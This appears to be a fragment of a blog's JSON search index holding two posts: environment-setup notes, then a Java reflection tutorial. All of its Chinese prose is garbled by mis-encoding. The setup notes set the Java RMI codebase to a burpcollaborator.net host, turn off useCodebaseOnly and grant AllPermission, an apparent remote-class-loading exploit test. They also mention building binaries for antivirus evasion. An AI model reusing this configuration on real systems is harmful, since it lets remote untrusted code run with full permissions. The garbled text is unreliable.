äº²æµ‹ç”¨-Dæ–¹å¼æ·»åŠ å‚æ•°æ²¡ç”¨ï¼ˆå¯èƒ½æ˜¯æˆ‘æœ¬åœ°ç¯å¢ƒå¤ªåƒåœ¾äº† ç ´win10ï¼‰\nSystem.setProperty(\u0026#34;java.rmi.server.useCodebaseOnly\u0026#34;,\u0026#34;false\u0026#34;); System.setProperty(\u0026#34;java.security.policy\u0026#34;,\u0026#34;E:\\\\client.policy\u0026#34;); System.setProperty(\u0026#34;java.rmi.server.codebase\u0026#34;,\u0026#34;http://nxo90f9obuj1boi0bzbdanmca3gt4i.burpcollaborator.net/\u0026#34;); if(System.getSecurityManager() == null){ System.out.println(\u0026#34;Setup SecurityManager...\u0026#34;); System.setSecurityManager(new SecurityManager()); } grant { permission java.security.AllPermission; }; å‚è€ƒï¼šhttps://coderanch.com/t/654168/java/java-security-AccessControlException-access-denied\nwindows\u0026#43;vscodeä½¿ç”¨gmpåº“(é™æ€åº“) ä¸‹è½½gmpï¼Œmsys2ï¼Œä¿®æ”¹msysçš„pacmançš„æº\n# msys2.exe pacman -Sy\t# åˆ·æ–°è½¯ä»¶åŒ…æ•°æ® pacman -S mingw-w64-x86_64-toolchain\t# å®‰è£…64ä½mingw # mingw64.exe pacman -Ss msys/gcc pacman -Ss msys/make cd D:/gmp\t# ä»¥ä¸‹æ­¥éª¤å¹¶ä¸ä¼šç‰¹åˆ«è€—æ—¶ åŠä¸ªå°æ—¶å†…åº”è¯¥å°±å¯ ./configure\tmake make check make install ç”Ÿæˆçš„é™æ€åº“æ–‡ä»¶åœ¨gmpå†…çš„.libsç›®å½•ä¸‹ï¼Œä½¿ç”¨æ—¶\n#include \u0026lt;D:/gmp-6.2.1/gmp.h\u0026gt; åœ¨vscodeçš„tasks.jsonä¸­æ·»åŠ è¿™æ ·çš„å‚æ•°\n\u0026#34;-I\u0026#34;, \u0026#34;D:\\\\gmp-6.2.1\u0026#34;, // gmp.hæ‰€åœ¨æ–‡ä»¶å¤¹ \u0026#34;-L\u0026#34;, \u0026#34;D:\\\\gmp-6.2.1\\\\.libs\u0026#34;, // .libsæ–‡ä»¶å¤¹è·¯å¾„ é™æ€åº“æ‰€åœ¨å¤„ \u0026#34;-l\u0026#34;, \u0026#34;gmp\u0026#34; // è¡¨ç¤ºlibgmp.aåº“ ç»§ç»­f5å³å¯ï¼ˆå› ä¸ºæˆ‘æ˜¯æŠŠf5å½“ç¼–è¯‘ç”¨çš„ runcodeä¸è¡Œ f5è¡Œï¼ˆï¼ˆï¼ˆ\nâ€”â€”â€”â€”æœ€ååæ§½ä¸€ä¸‹windowsä¸Šç¼–è¯‘cç¨‹åºçš„ç¹çé—®é¢˜ï¼ˆä»…é’ˆå¯¹vscode æ²¡ç”¨è¿‡vcï¼‰ã€‚æœ€å¼€å§‹å­¦cçš„æ—¶å€™é¡ºç€pythonç”¨vscodeçš„ä¹ æƒ¯å°±æƒ³ç€ç”¨vscodeå†™cï¼Œç„¶åæ ¹æ®æ•™ç¨‹é…å¥½äº†ç¯å¢ƒï¼šä¸‹è½½MinGWã€é…ç½®.vscodeçš„è°ƒè¯•ä¿¡æ¯ã€ä¸‹è½½vscodeçš„ç›¸å…³æ’ä»¶ï¼Œç»ˆäºå†™å‡ºäº†hello wordï¼Œä½†æ˜¯ä¹‹åé—®é¢˜ä¹Ÿæ²¡æ–­è¿‡ï¼Œæ¯”å¦‚å¤§å®¶éƒ½æ¸…æ¥šçš„æ§åˆ¶å°gbkå’Œutf-8ï¼Œä»¥åŠchcp 65001å’Œchcp 936çš„æ°¸æ’ä¹‹äº‰ï¼Œæœ€åæˆ‘å¦¥åçš„æ–¹å¼æ˜¯æŠŠæ‰€æœ‰çš„cæ–‡ä»¶ç¼–ç æ ¼å¼è®¾ä¸ºgbkï¼ŒåŒæ—¶å°†è°ƒè¯•å‚æ•°æ”¹ä¸º-finput-charset=GBK -fexec-charset=GBKï¼›ç¬¬äºŒä¸ªé—®é¢˜å°±æ˜¯MinGW64è¿™ä¸ªå‘è´§äº†ï¼Œå½“æ—¶å®‰è£…æ—¶æˆ‘å®Œå…¨æ²¡æ³¨æ„åˆ°è¿˜æœ‰å¾ˆå¤šé€‰é¡¹ï¼Œç›´æ¥zipè§£å‹çš„\ngcc version 8.1.0 (x86_64-posix-seh-rev0, Built by MinGW-W64 project) åæ¥åšå…æ€å‘ç°å¯„äº†ï¼Œè¿™ä¸ªsehçš„ç‰ˆæœ¬ä¸èƒ½ç¼–è¯‘32ä½çš„æ–‡ä»¶ï¼Œå³ä½¿åŠ äº†-m32ä¹Ÿä¸è¡Œï¼Œè‰ï¼Œå¦ˆçš„ã€‚æˆ‘å½“æ—¶ä¸æƒ³å†ç ´åä¸»æœºçš„ç¯å¢ƒï¼Œæ‰€ä»¥åœ¨è™šæ‹Ÿæœºè£…äº†sjljç‰ˆçš„ï¼Œç»ˆäºå¯ä»¥ç”¨-m32äº†\nå†ç„¶åå°±æ˜¯ç°åœ¨ï¼Œä¸ºäº†ç”¨gmpåº“æˆ‘è¿˜å¾—å€ŸåŠ©msysï¼Œç”¨å®ƒçš„makeï¼Œé‚£ä½ MinGWçš„cmakeæ˜¯å¹²ä»€ä¹ˆåƒçš„ï¼Ÿï¼Ÿï¼Ÿï¼Ÿï¼Ÿ\nè€Œä¸”ï¼Œè€Œä¸”ï¼Œmysysä¸‹é€šè¿‡pacmanå®‰è£…çš„MinGW64ä¹Ÿæ— æ³•æ­£ç¡®ç¼–è¯‘32ä½ç¨‹åº\næœ€åçš„è§£å†³æ–¹æ³•æ˜¯æŠŠsjljç‰ˆçš„ç›´æ¥è¦†ç›–æ‰æˆ‘ç”¨ä¸åˆ°çš„MinGW32æ–‡ä»¶å¤¹é‡Œï¼Œç„¶åå®ç°äº†é¡ºæ»‘çš„-m32\næ€»ä¹‹ã€‚è¿˜æ˜¯ã€‚éå¸¸æ— è¯­ã€‚\n","date":"2022-03-17T10:58:56+08:00","permalink":"https://amiaaaz.github.io/2022/03/17/maybe-help-someone/","section":"posts","tags":[],"title":"ç¯å¢ƒé…ç½®\u0026ç›¸å…³é—®é¢˜è§£å†³"},{"categories":["NOTES\u0026SUMMARY"],"contents":"å¹¶éJavaå¼€å‘è¦æŒæ¡çš„å…¨éƒ¨è¯­æ³•ï¼Œæˆ‘æŒ‘ç€æ¥çš„ï¼ˆæå‰å£°æ˜\nè¿˜æ˜¯å»–å¤§çš„Javaæ•™ç¨‹\nåå°„ åå°„Reflectionå¯ä»¥åœ¨ç¨‹åºè¿è¡ŒæœŸï¼Œå¯¹æŸä¸ªå®ä¾‹ä¸€æ— æ‰€çŸ¥çš„æƒ…å†µä¸‹ æ‹¿åˆ°ä¸€ä¸ªå¯¹è±¡çš„æ‰€æœ‰ä¿¡æ¯ï¼Œè°ƒç”¨å…¶æ–¹æ³•\næ˜¯ååˆ†å¼ºå¤§çš„è¯­è¨€æ­¦å™¨\nClass\u0026amp;åŠ¨æ€åŠ è½½ classç”±JVMåœ¨æ‰§è¡Œè¿‡ç¨‹ä¸­åŠ¨æ€åŠ è½½ï¼ŒJVMç¬¬ä¸€æ¬¡è¯»å–åˆ°ä¸€ç§classç±»å‹æ—¶ å°†å…¶åŠ è½½å…¥å†…å­˜ï¼ˆä¸é‡åˆ°ä¸ä¼šé¢„å…ˆåŠ è½½ï¼Œåˆ©ç”¨è¿™ä¸€ç‚¹å¯ä»¥åšåˆ°è¿è¡ŒæœŸæ ¹æ®æ¡ä»¶åŠ è½½ä¸åŒçš„å®ç°ç±»ï¼‰ï¼Œæ¯åŠ è½½ä¸€ç§classï¼ŒJVMå°±ä¸ºå…¶åˆ›å»ºä¸€ä¸ªClassç±»å‹çš„å®ä¾‹ å¹¶ä¸å…¶å…³è”èµ·æ¥ // classç±»å‹: åå«Classçš„class public final class Class{ private Class(){} } ä»¥Stringç±»ä¸ºä¾‹ï¼Œå½“JVMåŠ è½½Stringç±»æ—¶ï¼Œå®ƒé¦–å…ˆè¯»å–String.classå…¥å†…å­˜ï¼Œç„¶åä¸ºStringç±»åˆ›å»ºä¸€ä¸ªClasså®ä¾‹å¹¶å…³è”èµ·æ¥\nClass cls = new Class(String); è¿™ä¸ªClasså®ä¾‹çš„æ„é€ æ–¹æ³•ä¸ºprivateï¼Œåªæœ‰JVMå¯ä»¥åˆ›å»º\nJVMæŒæœ‰çš„æ¯ä¸ªClasså®ä¾‹éƒ½æŒ‡å‘ä¸€ä¸ªæ•°æ®ç±»å‹(class or interface) ä¸€ä¸ªClasså®ä¾‹åŒ…å«äº†è¯¥classçš„æ‰€æœ‰ä¿¡æ¯ï¼Œæ‰€ä»¥å¦‚æœè·å–äº†æŸä¸ªClasså®ä¾‹ï¼Œæˆ‘ä»¬å°±å¯ä»¥é€šè¿‡è¿™ä¸ªClasså®ä¾‹è·å–åˆ°è¯¥å®ä¾‹å¯¹åº”çš„classçš„æ‰€æœ‰ä¿¡æ¯ï¼Œè¿™å°±å«åå°„Reflection è·å–ä¸€ä¸ªclassçš„Classå®ä¾‹çš„ä¸‰ç§æ–¹æ³• // é€šè¿‡ä¸€ä¸ªclassçš„é™æ€å˜é‡classè·å– // å·²ç»åŠ è½½æŸä¸ªç±» è·å–å®ƒçš„java.lang.Classå¯¹è±¡ Class cls = String.class; // é€šè¿‡å®ä¾‹å˜é‡çš„getClassæ–¹æ³•è·å– // ä¸Šä¸‹æ–‡å·²å­˜åœ¨æŸä¸ªç±»çš„å®ä¾‹ String s = \u0026#34;Hello\u0026#34;; Class cls = s.getClass(); // é€šè¿‡é™æ€æ–¹æ³•Class.forNameè·å– // å‰ææ˜¯çŸ¥é“classçš„å®Œæ•´ç±»å Class cls = Class.forName(\u0026#34;java.lang.String\u0026#34;); å› ä¸ºClasså®ä¾‹åœ¨JVMä¸­æ˜¯å”¯ä¸€çš„ï¼Œæ‰€ä»¥ä¸Šè¿°æ–¹æ³•è·å–çš„Classå®ä¾‹æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œå¯ä»¥ç”¨==æ¯”è¾ƒ ä¸€èˆ¬åº”è¯¥ç”¨instanceofåˆ¤æ–­æ•°æ®ç±»å‹ï¼Œä¸ä½†åŒ¹é…æŒ‡å®šç±»å‹ï¼Œè¿˜åŒ¹é…æŒ‡å®šç±»å‹çš„å­ç±»ï¼›è€Œç”¨==åˆ¤æ–­classå®ä¾‹å¯ä»¥ç²¾ç¡®åœ°åˆ¤æ–­æ•°æ®ç±»å‹ï¼Œä½†ä¸èƒ½ä½œå­ç±»å‹æ¯”è¾ƒ Integer n = new Integer(123); boolean b1 = n instanceof Integer; // trueï¼Œå› ä¸ºnæ˜¯Integerç±»å‹ boolean b2 = n instanceof Number; // trueï¼Œå› ä¸ºnæ˜¯Numberç±»å‹çš„å­ç±» boolean b3 = n.getClass() == Integer.class; // trueï¼Œå› ä¸ºn.getClass()è¿”å›Integer.class boolean b4 = n.getClass() == Number.class; // falseï¼Œå› ä¸ºInteger.class!=Number.class é€šè¿‡åå°„è·å–å®ä¾‹çš„åŸºæœ¬ä¿¡æ¯çš„å°æ —å­ public class Main { public static void main(String[] args) {\t// æ³¨ printClassInfo(\u0026#34;\u0026#34;.getClass()); printClassInfo(Runnable.class); printClassInfo(java.time.Month.class); printClassInfo(String[].class); printClassInfo(int.class); } static void printClassInfo(Class cls) { System.out.println(\u0026#34;Class name: \u0026#34; + cls.getName()); System.out.println(\u0026#34;Simple name: \u0026#34; + cls.getSimpleName()); if (cls.getPackage() != null) { System.out.println(\u0026#34;Package name: \u0026#34; + cls.getPackage().getName()); } System.out.println(\u0026#34;is interface: \u0026#34; + cls.isInterface()); System.out.println(\u0026#34;is enum: \u0026#34; + cls.isEnum()); System.out.println(\u0026#34;is array: \u0026#34; + cls.isArray()); System.out.println(\u0026#34;is primitive: \u0026#34; + cls.isPrimitive()); } } String[]ä¹Ÿæ˜¯ä¸€ç§ç±»ï¼Œä¸åŒäºString.classï¼Œå®ƒçš„ç±»åæ˜¯[Ljava.lang.String;\næ¯ä¸€ç§åŸºæœ¬ç±»å‹å¯¹åº”çš„Classå®ä¾‹å¯ä»¥ç”¨åŸºæœ¬ç±»å‹.classè®¿é—®\nè·å–åˆ°Classå®ä¾‹åå¯ä»¥ç”¨å®ƒæ¥åˆ›å»ºå¯¹åº”ç±»å‹çš„å®ä¾‹ï¼Œä¸ç›´æ¥newçš„ç›¸æ¯”ï¼Œå±€é™åœ¨äºåªèƒ½è°ƒç”¨publicçš„æ— å‚æ•°æ„é€ æ–¹æ³•ï¼Œè€Œæœ‰å‚æ•°çš„æ„é€ æ–¹æ³• æˆ–épublicçš„æ„é€ æ–¹æ³•éƒ½æ— æ³•é€šè¿‡Class.newInstance()è°ƒç”¨\nClass cls = String.class; String s = (String) cls.newInstance(); // ç›¸å½“äº new String() è®¿é—®å­—æ®µ Classç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–å­—æ®µçš„ï¼ˆè¿”å›Fieldå¯¹è±¡ public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // æ ¹æ®å­—æ®µåè·å–æŸä¸ªpublicçš„field(åŒ…æ‹¬çˆ¶ç±») System.out.println(stdClass.getField(\u0026#34;score\u0026#34;));\t// è·å–publicå­—æ®µ\u0026#34;score\u0026#34; System.out.println(stdClass.getField(\u0026#34;name\u0026#34;));\t// è·å–ç»§æ‰¿çš„publicå­—æ®µ\u0026#34;name\u0026#34; // æ ¹æ®å­—æ®µåè·å–å½“å‰ç±»çš„æŸä¸ªfield(ä¸åŒ…æ‹¬çˆ¶ç±») System.out.println(stdClass.getDeclaredField(\u0026#34;grade\u0026#34;));\t// è·å–privateå­—æ®µ\u0026#34;grade\u0026#34; } } class Student extends Person { public int score; private int grade; } class Person { public String name; } ä¸€ä¸ªFieldå¯¹è±¡åŒ…å«ä¸€ä¸ªå­—æ®µçš„æ‰€æœ‰ä¿¡æ¯ Field f = String.class.getDeclaredField(\u0026#34;value\u0026#34;); // è¿”å›å­—æ®µåç§° f.getName(); // \u0026#34;value\u0026#34; // è¿”å›å­—æ®µç±»å‹ æ˜¯ä¸€ä¸ªClasså®ä¾‹(æ¯”å¦‚String.class) f.getType(); // class [B è¡¨ç¤ºbyte[]ç±»å‹ // è¿”å›å­—æ®µçš„ä¿®é¥°ç¬¦ æ˜¯ä¸€ä¸ªint ä¸åŒçš„bitæœ‰ä¸åŒçš„å«ä¹‰ int m = f.getModifiers(); Modifier.isFinal(m); // true Modifier.isPublic(m); // false Modifier.isProtected(m); // false Modifier.isPrivate(m); // true Modifier.isStatic(m); // false ç”¨Field.get(Object)å¯ä»¥è·å–æŒ‡å®šå®ä¾‹æŒ‡å®šå­—æ®µçš„å€¼ï¼›å¦‚æœå­—æ®µä¸ºprivateå¯ä»¥è°ƒç”¨Field.setAccessible(true)ï¼Œä¸€å¾‹è®¿é—®ï¼Œå¯èƒ½ä¼šå¤±è´¥çš„åŸå› æ˜¯JVMè¿è¡ŒæœŸSecurityManagerå¯èƒ½ä¸å…è®¸å¯¹javaå’Œjavaxå¼€å¤´çš„packageçš„ç±»è°ƒç”¨setAccessible(true)ï¼Œä¿æŠ¤JVMæ ¸å¿ƒåº“çš„å®‰å…¨ åŒæ ·çš„ï¼Œç”¨Field.set(Object, Object)å¯ä»¥è®¾ç½®å­—æ®µçš„å€¼ï¼Œç¬¬ä¸€ä¸ªObjectå‚æ•°æ˜¯æŒ‡å®šçš„å®ä¾‹ï¼Œç¬¬äºŒä¸ªObjectå‚æ•°æ˜¯å¾…ä¿®æ”¹çš„å€¼ import java.lang.reflect.Field; public class Main { public static void main(String[] args) throws Exception { Person p = new Person(\u0026#34;Xiao Ming\u0026#34;); System.out.println(p.getName()); // \u0026#34;Xiao Ming\u0026#34; Class c = p.getClass(); Field f = c.getDeclaredField(\u0026#34;name\u0026#34;); f.setAccessible(true);\t// ä¿®æ”¹épublicå­—æ®µ f.set(p, \u0026#34;Xiao Hong\u0026#34;); System.out.println(p.getName()); // \u0026#34;Xiao Hong\u0026#34; } } class Person { private String name; public Person(String name) { this.name = name; } public String getName() { return this.name; } } è°ƒç”¨æ–¹æ³• Classç±»æä¾›äº†ä»¥ä¸‹å‡ ä¸ªæ–¹æ³•æ¥è·å–æ–¹æ³•çš„ï¼ˆè¿”å›Methodå¯¹è±¡ public class Main { public static void main(String[] args) throws Exception { Class stdClass = Student.class; // è·å–æŸä¸ªpublicçš„Method(åŒ…æ‹¬çˆ¶ç±») System.out.println(stdClass.getMethod(\u0026#34;getScore\u0026#34;, String.class));\t// è·å–publicæ–¹æ³•getScoreï¼Œå‚æ•°ä¸ºString System.out.println(stdClass.getMethod(\u0026#34;getName\u0026#34;));\t// è·å–ç»§æ‰¿çš„publicæ–¹æ³•getNameï¼Œæ— å‚æ•° // è·å–å½“å‰ç±»çš„æŸä¸ªMethod(ä¸åŒ…æ‹¬çˆ¶ç±») System.out.println(stdClass.getDeclaredMethod(\u0026#34;getGrade\u0026#34;, int.class));\t// è·å–privateæ–¹æ³•getGradeï¼Œå‚æ•°ä¸ºint } } class Student extends Person { public int getScore(String type) { return 99; } private int getGrade(int year) { return 1; } } class Person { public String getName() { return \u0026#34;Person\u0026#34;; } } ä¸€ä¸ªMethodå¯¹è±¡åŒ…å«ä¸€ä¸ªæ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå‡½æ•°åŸºæœ¬åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜ å¾—åˆ°Methodåæˆ‘ä»¬å¯ä»¥å¯¹ä»–è¿›è¡Œè°ƒç”¨ï¼Œæ–¹å¼æ˜¯è°ƒç”¨å…¶invokeï¼Œç¬¬ä¸€ä¸ªå‚æ•°æ˜¯å¯¹è±¡å®ä¾‹ï¼Œåé¢ä¸ºå¯å˜å‚æ•°ï¼Œä¸æ–¹æ³•å‚æ•°ä¸€è‡´ import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { String s = \u0026#34;Hello world\u0026#34;;\t// Stringå¯¹è±¡ Method m = String.class.getMethod(\u0026#34;substring\u0026#34;, int.class);\t// è·å–String substring(int) String r = (String) m.invoke(s, 6);\t// è°ƒç”¨ System.out.println(r); } } å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œsubstringè‡ªèº«æœ‰ä¸¤ä¸ªé‡è½½æ–¹æ³•ï¼Œæˆ‘ä»¬è·å–çš„æ˜¯å…¶ä¸­çš„substring(int)è¿™ä¸ªæ–¹æ³•\nå¦‚æœè·å–åˆ°çš„Methodè¡¨ç¤ºä¸€ä¸ªé™æ€æ–¹æ³•ï¼Œè°ƒç”¨é™æ€æ–¹æ³•æ—¶ï¼Œç”±äºæ— éœ€æŒ‡å®šå®ä¾‹å¯¹è±¡ï¼Œæ‰€ä»¥invokeæ–¹æ³•ä¼ å…¥çš„ç¬¬ä¸€ä¸ªå‚æ•°æ°¸è¿œä¸ºnull import java.lang.reflect.Method; public class Main{ public static void main(String[] args) Method m = Integer.class.getMethod(\u0026#34;parseInt\u0026#34;, String.class);\t// è·å–Integer.parseInt(String) Integer n = (Integer) m.invoke(null, \u0026#34;12345\u0026#34;);\t// è°ƒç”¨ System.out.println(n); } åŒä¸Šä¸€ä¸ªä¸‰çº§æ ‡é¢˜å¯¹äºprivateå­—æ®µçš„å¤„ç†ï¼Œæˆ‘ä»¬å¯ä»¥ç”¨Method.setAccessible(true)ï¼Œä¹Ÿå­˜åœ¨åŒæ ·å¯èƒ½å¤±è´¥çš„åŸå› ï¼Œä¸é‡å¤äº† import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Person p = new Person(); Method m = p.getClass().getDeclaredMethod(\u0026#34;setName\u0026#34;, String.class); m.setAccessible(true); m.invoke(p, \u0026#34;Bob\u0026#34;); System.out.println(p.name); } } class Person { String name; private void setName(String name) { this.name = name; } } å¯¹äºå‚æ•°ä¸åŒçš„æ–¹æ³• æˆ‘ä»¬å¯ä»¥æŒ‡å®šå‚æ•°ç±»å‹å’Œæ•°é‡ï¼Œè€Œå¯¹äºå¤šæ€ï¼Œä»è¡¨ç°å‡ºå¤šæ€çš„åŸåˆ™ï¼Œå³ æ€»æ˜¯è°ƒç”¨å®é™…ç±»å‹çš„è¦†å†™æ–¹æ³•ï¼ˆå¦‚æœå­˜åœ¨ import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Method h = Person.class.getMethod(\u0026#34;hello\u0026#34;); h.invoke(new Student()); /** ç›¸å½“äº Person p = new Student(); p.hello(); */ } } class Person { public void hello() { System.out.println(\u0026#34;Person:hello\u0026#34;); } } class Student extends Person { public void hello() {\t// ç»§æ‰¿è‡ªPerson è¦†å†™helloæ–¹æ³• System.out.println(\u0026#34;Student:hello\u0026#34;); } } è°ƒç”¨æ„é€ æ–¹æ³• æ­£å¸¸çš„newä¼šè§¦å‘æ„é€ æ–¹æ³•ï¼Œé€šè¿‡classçš„newä¼šæœ‰å±€é™æ€§ï¼ˆè§ä¸Šï¼‰ï¼Œä¸ºäº†è°ƒç”¨ä»»æ„çš„æ„é€ æ–¹æ³•ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨åå°„çš„Constructorå¯¹è±¡ï¼Œå®ƒåŒ…å«ä¸€ä¸ªæ„é€ æ–¹æ³•çš„æ‰€æœ‰ä¿¡æ¯ï¼Œå¯ä»¥åˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼›Constructorå¯¹è±¡å’ŒMethodéå¸¸ç±»ä¼¼ï¼Œä¸åŒä¹‹å¤„ä»…åœ¨äºå®ƒæ˜¯ä¸€ä¸ªæ„é€ æ–¹æ³•ï¼Œå¹¶ä¸”ï¼Œè°ƒç”¨ç»“æœæ€»æ˜¯è¿”å›å®ä¾‹ import java.lang.reflect.Constructor; public class Main { public static void main(String[] args) throws Exception { // è·å–æŸä¸ªpublicçš„Constructor Constructor cons1 = Integer.class.getConstructor(int.class);\t// è·å–æ„é€ æ–¹æ³•Integer(int) Integer n1 = (Integer) cons1.newInstance(123);\t// è°ƒç”¨æ„é€ æ–¹æ³• System.out.println(n1); Constructor cons2 = Integer.class.getConstructor(String.class);\t// è·å–æ„é€ æ–¹æ³•Integer(String) Integer n2 = (Integer) cons2.newInstance(\u0026#34;456\u0026#34;); System.out.println(n2); } } æ³¨æ„Constructoræ€»æ˜¯å½“å‰ç±»å®šä¹‰çš„æ„é€ æ–¹æ³•ï¼Œå’Œçˆ¶ç±»æ— å…³ï¼Œå› æ­¤ä¸å­˜åœ¨å¤šæ€çš„é—®é¢˜ åŒä¸Šé¢ï¼Œå¯ä»¥æœ‰setAccessible(true)æ¥è°ƒç”¨épublicçš„Constructor è·å–ç»§æ‰¿å…³ç³» æœ€å¼€å§‹çš„ä¸‰çº§æ ‡é¢˜Classä¸­æåˆ°äº†ä¸‰ç§æ–¹å¼è·å–Classå®ä¾‹ï¼Œä»–ä»¬éƒ½æ˜¯åŒä¸€ä¸ªå®ä¾‹ï¼Œå› ä¸ºJVMå¯¹æ¯ä¸ªåŠ è½½çš„Classåªåˆ›å»ºä¸€ä¸ªClasså®ä¾‹æ¥è¡¨ç¤ºå®ƒçš„ç±»å‹ è·å–çˆ¶ç±»Class public class Main { public static void main(String[] args) throws Exception { Class i = Integer.class; Class n = i.getSuperclass(); System.out.println(n); Class o = n.getSuperclass(); System.out.println(o); System.out.println(o.getSuperclass()); } } è·å–æ¥å£ï¼ŒgetInterfacesåªè¿”å›å½“å‰ç±»ç›´æ¥å®ç°çš„æ¥å£ç±»å‹ï¼Œä¸åŒ…æ‹¬çˆ¶ç±»ï¼›å¦‚æœä¸€ä¸ªç±»æ²¡æœ‰å®ç°ä»»ä½•interfaceï¼Œé‚£ä¹ˆgetInterfacesè¿”å›ç©ºæ•°ç»„ import java.lang.reflect.Method; public class Main { public static void main(String[] args) throws Exception { Class s = Integer.class; Class[] is = s.getInterfaces(); for (Class i : is) { System.out.println(i); } } } å½“æˆ‘ä»¬åˆ¤æ–­ä¸€ä¸ªå®ä¾‹æ˜¯å¦æ˜¯æŸä¸ªç±»å‹æ—¶ï¼Œæ­£å¸¸æƒ…å†µä¸‹ä½¿ç”¨instanceof Object n = Integer.valueOf(123); boolean isDouble = n instanceof Double; // false boolean isInteger = n instanceof Integer; // true boolean isNumber = n instanceof Number; // true boolean isSerializable = n instanceof java.io.Serializable; // true å¦‚æœæ˜¯ä¸¤ä¸ªClasså®ä¾‹ï¼Œè¦åˆ¤æ–­ä¸€ä¸ªå‘ä¸Šè½¬å‹æ˜¯å¦æˆç«‹ï¼Œå¯ä»¥è°ƒç”¨isAssignableFrom() // Integer i = ? Integer.class.isAssignableFrom(Integer.class); // trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Integer // Number n = ? Number.class.isAssignableFrom(Integer.class); // trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Number // Object o = ? Object.class.isAssignableFrom(Integer.class); // trueï¼Œå› ä¸ºIntegerå¯ä»¥èµ‹å€¼ç»™Object // Integer i = ? Integer.class.isAssignableFrom(Number.class); // falseï¼Œå› ä¸ºNumberä¸èƒ½èµ‹å€¼ç»™Integer åŠ¨æ€ä»£ç† classå¯ä»¥å®ä¾‹åŒ–è€Œinterfaceä¸å¯ä»¥ï¼Œæ‰€æœ‰interfaceç±»å‹çš„å˜é‡æ€»æ˜¯é€šè¿‡æŸä¸ªå®ä¾‹å‘ä¸Šè½¬å‹å¹¶èµ‹å€¼ç»™æ¥å£ç±»å‹å˜é‡ CharSequence cs = new StringBuilder(); é™æ€æ–¹å¼ // å®šä¹‰æ¥å£ public interface Hellp{ void morning(String name); } // ç¼–å†™å®ç°ç±» public class HelloWorld implements Hellp{ public void morning(String name){ System.out.println(\u0026#34;Good morning, \u0026#34; + name); } } // åˆ›å»ºå®ä¾‹ è½¬å‹ä¸ºæ¥å£å¹¶è°ƒç”¨ Hello hello = new HelloWorld(); hello.morning(\u0026#34;Bob\u0026#34;); åŠ¨æ€ä»£ç†Dynamic Proxyå¯ä»¥åœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºæŸä¸ªinterfaceçš„å®ä¾‹ï¼Œä¸ç¼–å†™å®ç°ç±»ï¼Œç›´æ¥é€šè¿‡Proxy.newProxyInstance()åˆ›å»ºä¸€ä¸ªHelloæ¥å£å¯¹è±¡ import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class Main { public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() {\t// InvocationHandlerå®ä¾‹è´Ÿè´£å®ç°æ¥å£çš„æ–¹æ³•è°ƒç”¨ @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); if(method.getName().equals(\u0026#34;morning\u0026#34;)){ System.out.println(\u0026#34;Good mornig, \u0026#34; + args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance(\t// è¿”å›çš„Objectå¼ºåˆ¶è½¬å‹ä¸ºæ¥å£ Hello.class.getClassLoader(),\t// ä½¿ç”¨çš„ClassLoader é€šå¸¸ä¸ºæ¥å£ç±»çš„ClassLoader new Class[]{Hello.class},\t// éœ€è¦å®ç°çš„æ¥å£æ•°ç»„ è‡³å°‘ä¼ å…¥ä¸€ä¸ªæ¥å£ handler);\t// ç”¨æ¥å¤„ç†æ¥å£æ–¹æ³•è°ƒç”¨çš„InvocationHandlerå®ä¾‹ hello.morning(\u0026#34;Bob\u0026#34;); } } interface Hello{ void morning(String name); } åŠ¨æ€ä»£ç†å®é™…ä¸Šæ˜¯JVMåœ¨è¿è¡ŒæœŸåŠ¨æ€åˆ›å»ºclasså­—èŠ‚ç å¹¶åŠ è½½çš„è¿‡ç¨‹ï¼Œä¸Šé¢çš„æ”¹å†™ä¸ºé™æ€å®ç°æ˜¯è¿™æ ·çš„ public class HelloDynamicProxy implements Hello{ InvationHandler handler; public HelloDynamicProxy(InvocationHandler handler){ this.handler = handler; } public void morning(String name){ handler.invoke{ this, Hello.class.getMethod(\u0026#34;morning\u0026#34;, String.class), new Object[]{name}; } } } åªä¸è¿‡JVMç›´æ¥ç¼–å†™äº†è¿™ä¸ªä¸­é—´çš„ç±»ï¼Œä¸éœ€è¦æºç ï¼Œå¯ä»¥ç›´æ¥ç”Ÿæˆå­—èŠ‚ç \næ³¨è§£ æ³¨è§£Annotationï¼Œæ˜¯æ”¾åœ¨Javaæºç çš„ç±»ã€æ–¹æ³•ã€å­—æ®µã€å‚æ•°å‰çš„ä¸€ç§ç‰¹æ®Šæ³¨é‡Š\nä½¿ç”¨\u0026amp;å®šä¹‰æ³¨è§£ æ³¨è§£å¯åˆ†ä¸ºä¸‰ç±»\n1 ç¼–è¯‘å™¨ä½¿ç”¨çš„æ³¨è§£ï¼šè¿™ç±»æ³¨è§£ä¸ä¼šè¢«ç¼–è¯‘è¿›å…¥.classæ–‡ä»¶ï¼Œå®ƒä»¬åœ¨ç¼–è¯‘åå°±è¢«ç¼–è¯‘å™¨æ‰”æ‰äº† @Overrideï¼šè®©ç¼–è¯‘å™¨æ£€æŸ¥è¯¥æ–¹æ³•æ˜¯å¦æ­£ç¡®åœ°å®ç°äº†è¦†å†™\n@SuppressWarningsï¼šå‘Šè¯‰ç¼–è¯‘å™¨å¿½ç•¥æ­¤å¤„ä»£ç äº§ç”Ÿçš„è­¦å‘Š\n2 ç”±å·¥å…·å¤„ç†.classæ–‡ä»¶ä½¿ç”¨çš„æ³¨è§£ï¼šæœ‰äº›å·¥å…·ä¼šåœ¨åŠ 